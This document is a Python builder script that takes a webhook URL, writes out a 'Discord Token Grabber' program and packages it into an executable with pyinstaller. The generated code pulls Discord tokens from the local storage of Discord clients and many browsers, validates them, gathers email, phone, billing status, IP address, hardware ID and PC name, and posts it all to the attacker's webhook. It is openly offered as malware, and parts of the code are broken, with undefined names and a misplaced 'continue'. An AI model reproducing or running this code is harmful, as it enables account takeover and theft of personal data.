import os, sys
WEBHOOK_URL = sys.argv[1]

grabbercode = '''

import os
from re import findall
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from threading import Thread
from time import sleep
from sys import argv

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
WEBHOOK_URL = "''' + WEBHOOK_URL + '''"
PATHS = {
    "Discord": ROAMING + "\\Discord",
    "Lightcord": ROAMING + "\\\\Lightcord",
    "PTB": ROAMING + "\\\\discordptb",
    "Canary": ROAMING + "\\\\discordcanary",
    
    "Firefox": ROAMING + "\\\\Mozilla\\\\Firefox\\\\Profiles",

    "Amigo": LOCAL + "\\\\Amigo\\\\User Data",
    "Torch": LOCAL + "\\\\Torch\\\\User Data",
    "Kometa": LOCAL + "\\\\Kometa\\\\User Data",
    "Orbitum": LOCAL + "\\\\Orbitum\\\\User Data",
    "CentBrowser": LOCAL + "\\\\CentBrowser\\\\User Data",
    "7Star": LOCAL + "\\\\7Star\\\\7Star\\\\User Data",
    "Sputnik": LOCAL + "\\\\Sputnik\\\\Sputnik\\\\User Data",
    "Vivaldi": LOCAL + "\\\\Vivaldi\\\\User Data\\\\Default",
    "Chrome SxS": LOCAL + "\\\\Google\\\\Chrome SxS\\\\User Data",
    "Epic Privacy": LOCAL + "\\\\Epic Privacy Browser\\\\User Data",
    "Chrome": LOCAL + "\\\\Google\\\\Chrome\\\\User Data\\\\Default",
    "Uran": LOCAL + "\\\\uCozMedia\\\\Uran\\\\User Data\\\\Default",
    "Edge": LOCAL + "\\\\Microsoft\\\\Edge\\\\User Data\\\\Default",
    "Yandex": LOCAL + "\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default",
    "Opera Neon": LOCAL + "\\\\Opera Software\\\\Opera Neon\\\\User Data\\\\Default",
    "Brave": LOCAL + "\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default",
    "Opera": ROAMING + "\\\\Opera Software\\\\Opera Stable",
    "Opera GX": ROAMING + "\\\\Opera Software\\\\Opera GX Stable"
}


def getHeader(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
    }
    if token:
        headers.update({"Authorization": token})
    return headers


def getUserData(token):
    try:
        return loads(
            urlopen(Request("https://discordapp.com/api/v8/users/@me", headers=getHeader(token))).read().decode())
    except:
        pass


def getTokens(path, platform):
    try:
        if platform == "Firefox":
            for root, dirs, files in os.walk(path):
                for dir in dirs:
                    if not ".default" in dir:
                        pass
                    else:
                        if not os.path.isdir(temp_dir + 'firefoxtoken\\'):
                            os.mkdir(temp_dir + 'firefoxtoken\\')
                        try:
                            copyfile(path + dir + '\\' + 'webappsstore.sqlite',
                                     temp_dir + 'firefoxtoken\\' + 'webappsstore.sqlite')
                            connection = sqlite3.connect(temp_dir + 'firefoxtoken\\' + 'webappsstore.sqlite')
                            cursor = connection.cursor()
                            cursor.execute('SELECT key, value FROM webappsstore2')
                            values = cursor.fetchall()
                            for value in values:
                                if value[0] == "token":
                                    token = value[1].replace('"', '')
                                    try:
                                        t = b64decode(token[:24])
                                        int(t.decode())
                                    except Exception:
                                        pass
                                    else:
                                        tokens.append(token)
                                else:
                                    continue
                        except Exception:
                            pass
        else:
            path += "\\\\Local Storage\\\\leveldb"
            if not os.path.exists(path):
                continue
            for file_name in os.listdir(path):
                if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                    continue
                for l in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                        for Token in re.findall(regex, l):
                            tokens.append(Token)
        return tokens
    except:
        pass


def whoami():
    ip = "None"
    try:
        ip = urlopen(Request("https://ifconfig.me")).read().decode().strip()
    except:
        pass
    return ip


def HWID():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\\n")[1]


def paymentMethods(token):
    try:
        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v8/users/@me/billing/payment-sources",
                                              headers=getHeader(token))).read().decode())) > 0)
    except:
        pass




def main():
    cache_path = ROAMING + "\\\\.cache~$"
    prevent_spam = True
    self_spread = True
    embeds = []
    working = []
    checked = []
    already_cached_tokens = []
    working_ids = []
    ip = whoami()
    hwid = HWID()
    pc_username = os.getenv("UserName")
    pc_name = os.getenv("COMPUTERNAME")
    user_path_name = os.getenv("userprofile").split("\\\\")[2]
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in getTokens(path, platform):
            if token in checked:
                continue
            checked.append(token)
            uid = None
            if not token.startswith("mfa."):
                try:
                    uid = b64decode(token.split(".")[0].encode()).decode()
                except:
                    pass
                if not uid or uid in working_ids:
                    continue
            user_data = getUserData(token)
            if not user_data:
                continue
            working_ids.append(uid)
            working.append(token)
            username = user_data["username"] + "#" + str(user_data["discriminator"])
            user_id = user_data["id"]
            email = user_data.get("email")
            phone = user_data.get("phone")
            nitro = bool(user_data.get("premium_type"))
            billing = bool(paymentMethods(token))
            avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{user_data.get('avatar')}.jpg"
            embed = {
                "color": 0x7289da,
                "fields": [
                    {
                        "name": "Account Information",
                        "value": f'Email: {email}\\nPhone: {phone}\\nNitro: {nitro}\\nBilling Info: {billing}',
                        "inline": True
                    },
                    {
                        "name": "PC Information",
                        "value": f'IP: {ip}\\nUsername: {pc_username}\\nPC Name: {pc_name}\\nHWID: {hwid}\\nToken Location: {platform}',
                        "inline": True
                    },
                    {
                        "name": "Token",
                        "value": token,
                        "inline": False
                    }
                ],
                "thumbnail": {
                    "url": "https://reactselfbot.com/logo192.png"
                },
                "author": {
                    "name": f"{username} ({user_id})",
                    "icon_url": avatar_url
                }
            }
            embeds.append(embed)
    with open(cache_path, "a") as file:
        for token in checked:
            if not token in already_cached_tokens:
                file.write(token + "\\n")
    if len(working) == 0:
        working.append('123')
    webhook = {
        "content": "",
        "embeds": embeds,
        "username": "Discord Token Grabber",
        "avatar_url": "https://mehmetcanyildiz.com/wp-content/uploads/2020/11/black.png"
    }
    try:
        urlopen(Request(WEBHOOK_URL, data=dumps(webhook).encode(), headers=getHeader()))
    except:
        pass


try:
    main()
except Exception:
    pass
'''

open('generatedgrabber.py', 'wb').write(bytes(grabbercode.encode('ascii')))

os.system('pyinstaller --onefile -c -F generatedgrabber.py')
